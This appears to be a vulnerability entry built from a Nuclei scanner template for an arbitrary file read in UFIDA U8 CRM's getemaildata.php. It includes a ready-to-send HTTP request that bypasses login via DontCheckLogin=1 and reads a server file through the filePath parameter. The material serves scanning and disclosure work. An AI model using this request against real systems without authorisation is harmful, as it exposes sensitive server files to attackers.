# Nuclei Template: UFIDA U8 CRM getemaildata.php - Arbitrary File Read
**Template ID:** yonyou-u8-crm-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`yonyou-u8-crm-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in getemaildata.php of UFIDA U8 CRM customer relationship management system. An attacker can obtain sensitive files in the server through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20getemaildata.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
